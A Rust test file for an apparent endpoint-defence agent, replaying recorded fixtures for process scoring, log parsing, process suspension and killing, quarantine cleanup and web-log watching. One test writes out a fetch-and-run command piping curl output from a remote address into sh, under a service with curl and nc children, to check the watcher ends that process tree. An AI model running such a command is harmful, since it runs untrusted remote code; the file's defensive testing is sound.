//! Every recorded decision must come out the same. Each fixture is one decision, recorded once and kept: a change
//! that alters what the agent decides fails here.

use garrett::score::{agent_marks, containment_reason, score_process, Detection, Outcome, Remote, Signal, View};
use serde_json::Value;
use std::collections::HashMap;

fn fixtures(name: &str) -> Vec<Value> {
    let path = format!("{}/tests/fixtures/{name}.jsonl", env!("CARGO_MANIFEST_DIR"));
    std::fs::read_to_string(&path).unwrap_or_else(|_| panic!("{path} is missing: run rust/tests/export_fixtures.py"))
        .lines().filter(|line| !line.is_empty()).map(|line| serde_json::from_str(line).expect("a fixture line")).collect()
}

fn text(value: &Value) -> String {
    value.as_str().unwrap_or("").to_string()
}

fn view_from(value: &Value) -> View {
    let list = |key: &str| value[key].as_array().cloned().unwrap_or_default();
    View {
        name: text(&value["name"]),
        path: text(&value["path"]),
        parent_name: text(&value["parent_name"]),
        system: text(&value["system"]),
        cmdline: value["cmdline"].as_str().map(str::to_string),
        signature: value["signature"].as_array().map(|pair| (text(&pair[0]), text(&pair[1]))),
        remotes: list("remotes").iter().map(|item| Remote { address: text(&item[0]), port: item[1].as_u64().unwrap() as u16, names: item[2].as_array().unwrap().iter().map(text).collect() }).collect(),
        contacts: list("contacts").iter().map(|item| (text(&item[0]), item[1].as_u64().unwrap() as u16, item[2].as_array().unwrap().iter().map(|stamp| stamp.as_f64().unwrap()).collect())).collect(),
        inbound: list("inbound").iter().map(|item| (item[0].as_u64().unwrap() as u16, item[1].as_array().unwrap().iter().map(|source| (text(&source[0]), source[1].as_f64().unwrap())).collect())).collect(),
        trusted: value["trusted"].as_bool().unwrap(),
        baseline_days: value["baseline_days"].as_f64().unwrap(),
        baseline_overlap: value["baseline_overlap"].as_f64().unwrap(),
        detections: list("detections").iter().map(|item| Detection { name: if item["has_name"].as_bool().unwrap() { Some(text(&item["name"])) } else { None }, executed: item["executed"].as_bool().unwrap(), active: item["active"].as_bool().unwrap() }).collect(),
        file_age: value["file_age"].as_f64(),
        events: list("events").iter().map(|item| (text(&item["kind"]), item["count"].as_i64().unwrap())).collect(),
        origin: text(&value["origin"]),
        agent: list("agent").iter().map(|item| (text(&item[0]), item[1].as_array().unwrap().iter().map(|number| number.as_i64().unwrap()).collect())).collect(),
        exits: list("exits").iter().map(text).collect(),
        fleet: list("fleet").iter().map(|item| (text(&item[0]), text(&item[1]))).collect(),
        suspects: list("suspects").iter().map(text).collect(),
        served: value["served"].as_bool().unwrap(),
        siege: value["siege"].as_bool().unwrap(),
        jumped: false,
        handed: false,
        new_keyboard: false,
    }
}

fn outcome_from(value: &Value) -> Outcome {
    Outcome {
        score: value["score"].as_i64().unwrap(),
        level: text(&value["level"]),
        categories: value["categories"].as_array().unwrap().iter().map(text).collect(),
        signals: value["signals"].as_array().unwrap().iter().map(|signal| Signal { id: text(&signal["id"]), points: signal["points"].as_i64().unwrap(), category: text(&signal["category"]), evidence: text(&signal["evidence"]) }).collect(),
    }
}

#[test]
fn the_scorer_matches_on_every_recorded_decision() {
    let all = fixtures("score");
    assert!(all.len() >= 700, "only {} fixtures: regenerate them", all.len());
    let mut wrong = Vec::new();
    for (index, fixture) in all.iter().enumerate() {
        let policy: HashMap<String, i64> = fixture["policy"].as_object().unwrap().iter().map(|(key, value)| (key.clone(), value.as_i64().unwrap())).collect();
        let shapes: Vec<(String, String)> = fixture["shapes"].as_array().unwrap().iter().map(|pair| (text(&pair[0]), text(&pair[1]))).collect();
        let got = score_process(&view_from(&fixture["view"]), fixture["now"].as_f64().unwrap(), &policy, &shapes, fixture["system_root"].as_str().unwrap());
        let want = outcome_from(&fixture["expect"]);
        if got != want {
            wrong.push(format!("fixture {index}: {} under {}\n  recorded: {want:?}\n  now:      {got:?}", text(&fixture["view"]["name"]), text(&fixture["view"]["parent_name"])));
        }
    }
    assert!(wrong.is_empty(), "{} of {} decisions differ:\n{}", wrong.len(), all.len(), wrong.iter().take(5).cloned().collect::<Vec<_>>().join("\n"));
}

#[test]
fn containment_matches_on_every_recorded_decision() {
    let all = fixtures("reason");
    assert!(all.len() >= 100, "only {} fixtures: regenerate them", all.len());
    for fixture in &all {
        let outcome = outcome_from(&fixture["result"]);
        assert_eq!(containment_reason(&outcome), text(&fixture["expect"]), "for {outcome:?}");
    }
}

#[test]
fn automation_marks_match_on_every_recorded_decision() {
    let all = fixtures("marks");
    assert!(all.len() >= 300, "only {} fixtures: regenerate them", all.len());
    for fixture in &all {
        let stream: Vec<(f64, String)> = fixture["stream"].as_array().unwrap().iter().map(|item| (item[0].as_f64().unwrap(), text(&item[1]))).collect();
        let want: Vec<(String, Vec<i64>)> = fixture["expect"].as_array().unwrap().iter().map(|item| (text(&item[0]), item[1].as_array().unwrap().iter().map(|number| number.as_i64().unwrap()).collect())).collect();
        assert_eq!(agent_marks(&stream, fixture["now"].as_f64().unwrap(), fixture["window"].as_f64().unwrap()), want, "for {stream:?}");
    }
}

#[test]
fn the_parsers_match_on_every_recorded_sample() {
    use garrett::parse::{listening_pids, parse_lsof, parse_ps, parse_ss, plain_address, Conn};
    let all = fixtures("parse");
    assert!(all.len() >= 18, "only {} fixtures: regenerate them", all.len());
    let rows = |found: Vec<Conn>| -> Vec<Value> { found.into_iter().map(|c| serde_json::json!([c.pid, c.lport, c.raddr, c.rport, c.inbound, c.laddr])).collect() };
    for fixture in &all {
        let raw = fixture["raw"].as_str().unwrap();
        match fixture["tool"].as_str().unwrap() {
            "ss" => {
                assert_eq!(Value::Array(rows(parse_ss(raw))), fixture["expect"], "ss: {raw}");
                let mut listening: Vec<u32> = listening_pids(raw).into_iter().collect();
                listening.sort_unstable();
                assert_eq!(serde_json::json!(listening), fixture["listening"], "listening: {raw}");
            }
            "lsof" => assert_eq!(Value::Array(rows(parse_lsof(raw))), fixture["expect"], "lsof: {raw}"),
            "ps" => {
                let found: Vec<Value> = parse_ps(raw).into_iter().map(|p| serde_json::json!([p.pid, p.ppid, p.name, p.path])).collect();
                assert_eq!(Value::Array(found), fixture["expect"], "ps: {raw}");
            }
            "address" => assert_eq!(plain_address(raw), text(&fixture["expect"]), "address: {raw}"),
            other => panic!("unknown tool {other}"),
        }
    }
}

/// Build one recorded /proc tree in a temporary folder.
#[cfg(unix)]
fn build(folder: &std::path::Path, entries: &Value) {
    for (name, spec) in entries.as_object().unwrap() {
        let entry = folder.join(name);
        std::fs::create_dir(&entry).unwrap();
        if let Some(stat) = spec["stat"].as_str() {
            std::fs::write(entry.join("stat"), stat).unwrap();
        }
        if let Some(exe) = spec["exe"].as_str() {
            std::os::unix::fs::symlink(exe, entry.join("exe")).unwrap();
        }
        if let Some(bytes) = spec["cmdline"].as_array() {
            std::fs::write(entry.join("cmdline"), bytes.iter().map(|byte| byte.as_u64().unwrap() as u8).collect::<Vec<u8>>()).unwrap();
        }
    }
}

#[cfg(unix)]
#[test]
fn the_linux_sensor_matches_on_every_recorded_tree() {
    use garrett::linux::{LinuxSensor, Snap};
    let all = fixtures("proc");
    assert!(all.len() >= 2, "only {} fixtures: regenerate them on a system that can make symbolic links", all.len());
    let rows = |found: Vec<Snap>| -> Value { Value::Array(found.into_iter().map(|snap| serde_json::json!([snap.proc.pid, snap.proc.ppid, snap.proc.name, snap.proc.path, snap.proc.started, snap.cmdline, snap.parent])).collect()) };
    for (index, fixture) in all.iter().enumerate() {
        let folder = std::env::temp_dir().join(format!("garrett-proc-{}-{index}", std::process::id()));
        let _ = std::fs::remove_dir_all(&folder);
        std::fs::create_dir_all(&folder).unwrap();
        build(&folder, &fixture["first"]);
        let mut sensor = LinuxSensor::new(&folder);
        let processes: Vec<Value> = sensor.processes().into_iter().map(|p| serde_json::json!([p.pid, p.ppid, p.name, p.path, p.started])).collect();
        assert_eq!(Value::Array(processes), fixture["expect"]["processes"], "processes, tree {index}");
        assert_eq!(rows(sensor.fresh()), fixture["expect"]["fresh_first"], "first look, tree {index}");
        build(&folder, &fixture["later"]);
        assert_eq!(rows(sensor.fresh()), fixture["expect"]["fresh_second"], "second look, tree {index}");
        assert_eq!(rows(sensor.fresh()), fixture["expect"]["fresh_third"], "third look, tree {index}");
        let ask: Vec<u32> = fixture["ask"].as_array().unwrap().iter().map(|pid| pid.as_u64().unwrap() as u32).collect();
        let lines: Vec<Value> = sensor.command_lines(&ask).into_iter().map(|(pid, line)| serde_json::json!([pid, line])).collect();
        assert_eq!(Value::Array(lines), fixture["expect"]["command_lines"], "command lines, tree {index}");
        let _ = std::fs::remove_dir_all(&folder);
    }
}

#[test]
fn most_programs_cost_one_look_at_their_name() {
    use garrett::linux::exec_worth;
    assert!(exec_worth("/usr/bin/dash") && exec_worth("/usr/bin/python3.12") && exec_worth("/tmp/x/updater") && exec_worth("/home/a/Downloads/tool"));
    assert!(!exec_worth("/usr/bin/true") && !exec_worth("/usr/bin/gcc") && !exec_worth("/usr/lib/git-core/git") && !exec_worth(""));
}

mod scripted {
    use garrett::parse::{Conn, Proc};
    use garrett::watch::{Activity, Found, Hands, Sensor};
    use serde_json::Value;
    use std::collections::HashMap;

    /// A scripted sensor: fixed answers read from one recorded event.
    pub struct Scripted {
        pub system: String,
        pub procs: Vec<Proc>,
        pub conns: Vec<Conn>,
        pub lines: HashMap<u32, String>,
        pub unsigned: Vec<String>,
        pub names: HashMap<String, Vec<String>>,
        pub found: Vec<Found>,
        pub events: Vec<Activity>,
        pub ages: HashMap<String, f64>,
        pub listening: std::collections::HashSet<u32>,
    }

    fn text(value: &Value) -> String {
        value.as_str().unwrap_or("").to_string()
    }

    impl Scripted {
        pub fn from(event: &Value) -> Scripted {
            let list = |key: &str| event[key].as_array().cloned().unwrap_or_default();
            Scripted {
                system: text(&event["system"]),
                procs: list("procs").iter().map(|p| Proc { pid: p[0].as_u64().unwrap() as u32, ppid: p[1].as_u64().unwrap() as u32, name: text(&p[2]), path: text(&p[3]), started: p[4].as_u64().unwrap() }).collect(),
                conns: Vec::new(),
                lines: list("lines").iter().map(|item| (item[0].as_u64().unwrap() as u32, text(&item[1]))).collect(),
                unsigned: list("unsigned").iter().map(text).collect(),
                names: list("names").iter().map(|item| (text(&item[0]), item[1].as_array().unwrap().iter().map(text).collect())).collect(),
                found: list("found").iter().map(|item| Found { id: text(&item["id"]), name: text(&item["name"]), executed: item["executed"].as_bool().unwrap_or(false), active: item["active"].as_bool().unwrap_or(false), at: item["at"].as_f64().unwrap_or(0.0), process: text(&item["process"]), resource: text(&item["resource"]) }).collect(),
                events: list("events").iter().map(|item| Activity { kind: text(&item["kind"]), account: text(&item["account"]), count: item["count"].as_i64().unwrap_or(0) }).collect(),
                ages: list("ages").iter().map(|item| (text(&item[0]), item[1].as_f64().unwrap())).collect(),
                listening: std::collections::HashSet::new(),
            }
        }
    }

    impl Sensor for Scripted {
        fn system(&self) -> &str {
            &self.system
        }
        fn processes(&mut self) -> Vec<Proc> {
            self.procs.clone()
        }
        fn connections(&mut self) -> Vec<Conn> {
            self.conns.clone()
        }
        fn command_lines(&mut self, pids: &[u32]) -> HashMap<u32, String> {
            pids.iter().map(|pid| (*pid, self.lines.get(pid).cloned().unwrap_or_default())).collect()
        }
        fn signatures(&mut self, paths: &[String]) -> HashMap<String, (String, String)> {
            paths.iter().map(|path| (path.clone(), if self.unsigned.contains(path) { ("unsigned".to_string(), String::new()) } else { ("signed".to_string(), "CN=Vendor Inc".to_string()) })).collect()
        }
        fn names(&mut self) -> HashMap<String, Vec<String>> {
            self.names.clone()
        }
        fn detections(&mut self) -> Vec<Found> {
            self.found.clone()
        }
        fn directory_events(&mut self) -> Option<Vec<Activity>> {
            Some(self.events.clone())
        }
        fn file_age(&mut self, path: &str, _now: f64) -> Option<f64> {
            self.ages.get(path).copied()
        }
        fn listening(&self) -> std::collections::HashSet<u32> {
            self.listening.clone()
        }
    }

    #[derive(Default)]
    pub struct Recorded {
        pub frozen: Vec<u32>,
        pub let_go: Vec<u32>,
        pub killed: Vec<u32>,
    }

    impl Hands for Recorded {
        fn suspend(&mut self, pid: u32) -> bool {
            self.frozen.push(pid);
            true
        }
        fn resume(&mut self, pid: u32) -> bool {
            self.let_go.push(pid);
            true
        }
        fn kill(&mut self, pid: u32) -> bool {
            self.killed.push(pid);
            true
        }
    }
}

#[test]
fn the_watcher_matches_on_every_look_of_the_hundred_scripted_events() {
    use garrett::parse::Conn;
    use garrett::watch::{Mode, Watcher};
    let all = fixtures("events");
    assert_eq!(all.len(), 100, "regenerate the fixtures");
    let (mut wrong, mut looks, mut reported) = (Vec::new(), 0, 0);
    for event in &all {
        let sensor = scripted::Scripted::from(event);
        let mut watcher = Watcher::new(sensor, Some(scripted::Recorded::default()), &"a".repeat(64), Mode::Pause, event["system_root"].as_str().unwrap());
        watcher.own.insert(1_000_000_000);
        for look in event["looks"].as_array().unwrap() {
            let now = 1_800_000_000.0 + look["t"].as_f64().unwrap();
            watcher.sensor.conns = look["conns"].as_array().unwrap().iter().map(|c| Conn::new(c[0].as_u64().unwrap() as u32, c[1].as_u64().unwrap() as u32, c[2].as_str().unwrap(), c[3].as_u64().unwrap() as u32, c[4].as_bool().unwrap(), c[5].as_str().unwrap())).collect();
            watcher.fast(now);
            let cases = watcher.tick(now);
            watcher.mark_reported(&cases, now);
            looks += 1;
            reported += cases.len();
            if Value::Array(cases.clone()) != look["cases"] {
                wrong.push(format!("{} at {}s\n  recorded: {}\n  now:      {}", text(&event["title"]), look["t"], look["cases"], Value::Array(cases)));
                break;
            }
        }
        let frozen: Vec<Value> = watcher.hands.as_ref().unwrap().frozen.iter().map(|pid| serde_json::json!(pid)).collect();
        if Value::Array(frozen.clone()) != event["frozen"] {
            wrong.push(format!("{}: recorded {} frozen, now {:?}", text(&event["title"]), event["frozen"], frozen));
        }
    }
    assert!(wrong.is_empty(), "{} of 100 events differ:\n{}", wrong.len(), wrong.iter().take(3).map(|line| line.chars().take(1800).collect::<String>()).collect::<Vec<_>>().join("\n"));
    assert!(looks >= 300 && reported >= 75, "only {looks} looks and {reported} cases replayed");
}

#[test]
fn acting_at_the_event_matches_step_by_step() {
    use garrett::linux::Snap;
    use garrett::parse::Proc;
    use garrett::watch::{Mode, Watcher};
    const BIG: u32 = 3_000_000_000;
    let all = fixtures("instant");
    assert!(all.len() >= 5, "regenerate the fixtures");
    let mut steps_checked = 0;
    for sequence in &all {
        if let Some(shapes) = sequence["shapes"].as_array() {
            for pair in shapes {
                assert_eq!(Watcher::<scripted::Scripted, scripted::Recorded>::shape(pair[0].as_str().unwrap()), text(&pair[1]), "shape of {}", pair[0]);
            }
            continue;
        }
        let mut sensor = scripted::Scripted::from(&serde_json::json!({"system": "linux"}));
        sensor.procs = vec![
            Proc { pid: 1, ppid: 0, name: "systemd".into(), path: "/usr/lib/systemd/systemd".into(), started: 1 },
            Proc { pid: 300, ppid: 1, name: "sshd".into(), path: "/usr/sbin/sshd".into(), started: 1 },
            Proc { pid: 400, ppid: 1, name: "cron".into(), path: "/usr/sbin/cron".into(), started: 1 },
            Proc { pid: 500, ppid: 300, name: "bash".into(), path: "/usr/bin/bash".into(), started: 1 },
            Proc { pid: BIG, ppid: 1, name: "python3".into(), path: "/usr/bin/python3".into(), started: 1 },
            Proc { pid: BIG + 1, ppid: 1, name: "php-fpm8.3".into(), path: "/usr/sbin/php-fpm8.3".into(), started: 1 },
        ];
        sensor.listening.insert(BIG);
        let mode = if sequence["mode"] == "pause" { Mode::Pause } else { Mode::Kill };
        let hands = sequence["respond"].as_bool().unwrap().then(scripted::Recorded::default);
        let mut watcher = Watcher::new(sensor, hands, &"a".repeat(64), mode, "c:\\windows\\");
        watcher.own.insert(1_000_000_000);
        watcher.event_feed = true;
        watcher.tick(1_799_999_990.0); // one look first, so it knows which programs accept connections
        if sequence["trust"].as_bool().unwrap() {
            let key = watcher.case_key(&Proc { pid: 1, ppid: 1, name: "dash".into(), path: "/usr/bin/dash".into(), started: 1 }, "python3");
            watcher.trusted.insert(key);
        }
        let mut pending: Vec<Snap> = Vec::new();
        for (index, step) in sequence["steps"].as_array().unwrap().iter().enumerate() {
            let now = 1_800_000_000.0 + step["t"].as_f64().unwrap();
            let at = format!("mode {} respond {} step {index} ({})", sequence["mode"], sequence["respond"], step["do"]);
            if step["do"] == "exec" {
                let path = text(&step["path"]);
                let proc = Proc { pid: step["pid"].as_u64().unwrap() as u32, ppid: step["ppid"].as_u64().unwrap() as u32, name: path.rsplit('/').next().unwrap().to_string(), path, started: 1 };
                if step["running"].as_bool().unwrap_or(false) {
                    watcher.sensor.procs.push(proc.clone());
                    if let Some(child) = step["child"].as_u64() {
                        watcher.sensor.procs.push(Proc { pid: child as u32, ppid: proc.pid, name: "curl".into(), path: "/usr/bin/curl".into(), started: 1 });
                    }
                }
                let snap = Snap { proc, cmdline: text(&step["line"]), parent: text(&step["parent"]), jumped: false, handed: false };
                watcher.on_exec(&snap, now);
                pending.push(snap);
            } else {
                let cases = watcher.tick_with(now, &pending);
                pending.clear();
                watcher.mark_reported(&cases, now);
                assert_eq!(Value::Array(cases), step["cases"], "cases, {at}");
            }
            let empty = scripted::Recorded::default();
            let hands = watcher.hands.as_ref().unwrap_or(&empty);
            assert_eq!(serde_json::json!(hands.frozen), step["frozen"], "frozen, {at}");
            assert_eq!(serde_json::json!(hands.let_go), step["let_go"], "let go, {at}");
            assert_eq!(serde_json::json!(hands.killed), step["killed"], "ended, {at}");
            assert_eq!(serde_json::json!(watcher.urgent), step["urgent"], "urgent, {at}");
            assert_eq!(serde_json::json!(watcher.acted_at_the_event()), step["instant"], "waiting to be said, {at}");
            assert_eq!(serde_json::json!(watcher.under_attack()), step["sieges"], "held services, {at}");
            assert_eq!(serde_json::json!(watcher.habit_counts()), step["habits"], "habits, {at}");
            steps_checked += 1;
        }
    }
    assert!(steps_checked >= 25, "only {steps_checked} steps replayed");
}

#[test]
fn a_program_ended_at_the_event_takes_what_it_started_with_it() {
    use garrett::linux::Snap;
    use garrett::parse::Proc;
    use garrett::watch::{Mode, Watcher};
    let proc = |pid: u32, ppid: u32, name: &str| Proc { pid, ppid, name: name.into(), path: format!("/usr/bin/{name}"), started: 1 };
    let mut sensor = scripted::Scripted::from(&serde_json::json!({"system": "linux"}));
    // A service, the shell it was made to start, what that shell started, and an unrelated program.
    sensor.procs = vec![proc(50, 1, "python3"), proc(60, 50, "dash"), proc(61, 60, "curl"), proc(62, 60, "dash"), proc(63, 62, "nc"), proc(70, 50, "convert")];
    sensor.listening.insert(50);
    let mut watcher = Watcher::new(sensor, Some(scripted::Recorded::default()), &"a".repeat(64), Mode::Kill, "c:\\windows\\");
    watcher.tick(1_800_000_000.0);
    watcher.on_exec(&Snap { proc: proc(60, 50, "dash"), cmdline: "sh -c curl -s http://198.51.100.9/p | sh".into(), parent: "python3".into(), jumped: false, handed: false }, 1_800_000_001.0);
    let hands = watcher.hands.as_ref().unwrap();
    assert_eq!(hands.frozen, vec![60], "held first");
    let mut ended = hands.killed.clone();
    assert_eq!(ended.last(), Some(&60), "the shell itself goes last");
    ended.sort_unstable();
    assert_eq!(ended, vec![60, 61, 62, 63], "everything it started, and nothing else");
    assert!(hands.let_go.is_empty());
    assert_eq!(watcher.acted_at_the_event()[0].1["programs"], 4);
}

#[cfg(unix)]
mod machine {
    use serde_json::Value;
    use std::os::unix::fs::PermissionsExt;
    use std::path::Path;

    pub fn latin(text: &str) -> Vec<u8> {
        text.chars().map(|c| c as u32 as u8).collect()
    }

    pub fn unlatin(bytes: &[u8]) -> String {
        bytes.iter().map(|byte| *byte as char).collect()
    }

    /// Put one file, folder or link of a made-up machine in place.
    pub fn write(base: &Path, rel: &str, content: &Value, mode: u32, age_days: f64) {
        let target = base.join(rel);
        std::fs::create_dir_all(target.parent().unwrap()).unwrap();
        let where_ = base.to_string_lossy().into_owned();
        match content.as_str() {
            None => {
                let _ = std::fs::create_dir(&target);
            }
            Some(text) if text.starts_with("->") => {
                std::os::unix::fs::symlink(text[2..].replace("<ROOT>", &where_), &target).unwrap();
                return;
            }
            Some(text) => {
                if target.exists() {
                    std::fs::set_permissions(&target, std::fs::Permissions::from_mode(0o600)).unwrap();
                }
                std::fs::write(&target, latin(&text.replace("<ROOT>", &where_))).unwrap();
            }
        }
        std::fs::set_permissions(&target, std::fs::Permissions::from_mode(mode)).unwrap();
        if age_days > 0.0 {
            let stamp = std::time::SystemTime::now() - std::time::Duration::from_secs_f64(age_days * 86400.0);
            let file = std::fs::File::options().write(true).open(&target).unwrap();
            file.set_modified(stamp).unwrap();
        }
    }

    fn walk(folder: &Path, base: &Path, skip: Option<&Path>, found: &mut Vec<(String, Value)>) {
        let mut entries: Vec<_> = std::fs::read_dir(folder).unwrap().map(|entry| entry.unwrap().path()).collect();
        entries.sort();
        for entry in entries {
            if skip == Some(entry.as_path()) {
                continue;
            }
            let meta = std::fs::symlink_metadata(&entry).unwrap();
            let label = entry.strip_prefix(base).unwrap().to_string_lossy().into_owned();
            let where_ = base.to_string_lossy().into_owned();
            if meta.file_type().is_symlink() {
                if entry.is_dir() {
                    continue; // a link to a folder: the recording does not list those
                }
                found.push((label, serde_json::json!([format!("->{}", std::fs::read_link(&entry).unwrap().to_string_lossy().replace(&where_, "<ROOT>")), 0])));
            } else if meta.is_dir() {
                walk(&entry, base, skip, found);
            } else {
                let mode = meta.permissions().mode() & 0o7777;
                let was = meta.permissions();
                if mode & 0o400 == 0 {
                    std::fs::set_permissions(&entry, std::fs::Permissions::from_mode(0o600)).unwrap();
                }
                let body = unlatin(&std::fs::read(&entry).unwrap()).replace(&where_, "<ROOT>");
                std::fs::set_permissions(&entry, was).unwrap();
                found.push((label, serde_json::json!([body, mode])));
            }
        }
    }

    /// Every file of the machine outside the agent's own folder, with its permissions.
    pub fn files(base: &Path) -> Value {
        let mut found = Vec::new();
        walk(base, base, Some(&base.join("state")), &mut found);
        Value::Object(found.into_iter().collect())
    }

    /// What is in quarantine, with its permissions.
    pub fn kept(base: &Path) -> Value {
        let folder = base.join("state").join("quarantine");
        let mut found = Vec::new();
        if folder.exists() {
            walk(&folder, &folder, None, &mut found);
        }
        let mut rows: Vec<Value> = found.into_iter().map(|(label, value)| serde_json::json!([label, value[1]])).collect();
        rows.sort_by_key(|row| row[0].as_str().unwrap().to_string());
        Value::Array(rows)
    }
}

#[cfg(unix)]
#[test]
fn the_cleaner_and_startup_watch_match_on_every_made_up_machine() {
    use garrett::clean::{Cleaner, StartupWatch};
    let all = fixtures("clean");
    assert!(all.len() >= 4, "regenerate the fixtures on a system that can make symbolic links");
    let mut checked = 0;
    for (number, scenario) in all.iter().enumerate() {
        let base = std::env::temp_dir().join(format!("garrett-machine-{}-{number}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);
        std::fs::create_dir_all(&base).unwrap();
        let where_ = base.to_string_lossy().into_owned();
        let fill = |value: &Value| value.as_str().unwrap().replace("<ROOT>", &where_);
        for item in scenario["tree"].as_array().unwrap() {
            machine::write(&base, item[0].as_str().unwrap(), &item[1], item[2].as_u64().unwrap() as u32, item[3].as_f64().unwrap());
        }
        let system = scenario["system"].as_str().unwrap();
        let cleaner = Cleaner::new(system, &base.join("state"), Some(&base), scenario["inside"].as_bool().unwrap());
        let mut watch: Option<StartupWatch> = None;
        let now = || std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs_f64();
        for (index, step) in scenario["steps"].as_array().unwrap().iter().enumerate() {
            let at = format!("machine {number} step {index} ({})", step["op"]);
            let strings = |key: &str| -> Vec<String> { step[key].as_array().unwrap().iter().map(&fill).collect() };
            let result: Value = match step["op"].as_str().unwrap() {
                "clean" => Value::Array(cleaner.clean(step["key"].as_str().unwrap(), &strings("paths"), &strings("addresses"), if step["since"].as_bool().unwrap() { now() } else { 0.0 }, now())),
                "disable" => {
                    let lines: Vec<Vec<u8>> = strings("lines").into_iter().map(String::into_bytes).collect();
                    Value::Array(cleaner.disable(step["key"].as_str().unwrap(), step["kind"].as_str().unwrap(), &fill(&step["where"]), step["how"] == "file", &lines, now()))
                }
                "restore" => {
                    let (back, left) = cleaner.restore(step["key"].as_str().unwrap(), now());
                    serde_json::json!([back, left])
                }
                "removable" => serde_json::json!(cleaner.removable(&strings("paths"))),
                "cleaned" => serde_json::json!(cleaner.cleaned()),
                "watch" => {
                    watch = Some(StartupWatch::new(system, &base.join("state"), Some(&base)));
                    Value::Null
                }
                "poll" => Value::Array(watch.as_mut().unwrap().poll().into_iter().map(|item| serde_json::json!({"kind": item.kind, "where": item.where_, "how": if item.whole { "file" } else { "lines" },
                    "lines": item.lines.iter().map(|line| machine::unlatin(line)).collect::<Vec<_>>()})).collect()),
                "write" => {
                    std::thread::sleep(std::time::Duration::from_millis(20));
                    for item in step["files"].as_array().unwrap() {
                        machine::write(&base, item[0].as_str().unwrap(), &item[1], item[2].as_u64().unwrap() as u32, 0.0);
                    }
                    Value::Null
                }
                "remove" => {
                    for item in step["files"].as_array().unwrap() {
                        std::fs::remove_file(base.join(item.as_str().unwrap())).unwrap();
                    }
                    Value::Null
                }
                other => panic!("unknown step {other}"),
            };
            let result: Value = serde_json::from_str(&result.to_string().replace(&where_, "<ROOT>")).unwrap();
            assert_eq!(result, step["result"], "result, {at}");
            assert_eq!(machine::files(&base), step["after"], "the machine's files, {at}");
            assert_eq!(machine::kept(&base), step["kept"], "quarantine, {at}");
            checked += 1;
        }
        let _ = std::process::Command::new("chmod").args(["-R", "u+rwx", &where_]).status();
        let _ = std::fs::remove_dir_all(&base);
    }
    assert!(checked >= 30, "only {checked} steps replayed");
}

#[test]
fn the_web_log_watch_matches_on_every_scripted_step() {
    use garrett::web::WebWatch;
    use std::io::Write;
    let base = std::env::temp_dir().join(format!("garrett-web-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&base);
    std::fs::create_dir_all(base.join("www")).unwrap();
    let logs = ["access.log", "docker-json.log", "pod.log", "iis.log"];
    for name in logs {
        std::fs::write(base.join(name), b"an earlier line\n").unwrap();
    }
    let whole = |name: &str| base.join(name).to_string_lossy().into_owned();
    let mut watch = WebWatch::new(logs.iter().map(|name| whole(name)).collect(), vec![whole("www")]);
    let mut said = 0;
    for (index, step) in fixtures("web").iter().enumerate() {
        for (name, text) in step["append"].as_object().unwrap() {
            std::fs::OpenOptions::new().append(true).open(base.join(name)).unwrap().write_all(text.as_str().unwrap().as_bytes()).unwrap();
        }
        for (name, text) in step["replace"].as_object().unwrap() {
            std::fs::write(base.join(name), text.as_str().unwrap()).unwrap();
        }
        for name in step["create"].as_array().unwrap() {
            let path = base.join(name.as_str().unwrap());
            std::fs::create_dir_all(path.parent().unwrap()).unwrap();
            std::fs::write(path, b"").unwrap();
        }
        let (clients, scripts) = watch.poll(step["now"].as_f64().unwrap());
        let clients: Vec<Value> = clients.into_iter().map(|(client, marks)| serde_json::json!([client, marks.into_iter().map(|(id, points, text)| serde_json::json!([id, points, text])).collect::<Vec<_>>()])).collect();
        let scripts: Vec<String> = scripts.iter().map(|path| std::path::Path::new(path).strip_prefix(&base).unwrap().to_string_lossy().replace('\\', "/")).collect();
        assert_eq!(Value::Array(clients), step["clients"], "clients, step {index}");
        assert_eq!(serde_json::json!(scripts), step["scripts"], "scripts, step {index}");
        said += usize::from(!step["clients"].as_array().unwrap().is_empty() || !scripts.is_empty());
    }
    let _ = std::fs::remove_dir_all(&base);
    assert!(said >= 15, "only {said} steps had something to say");
}
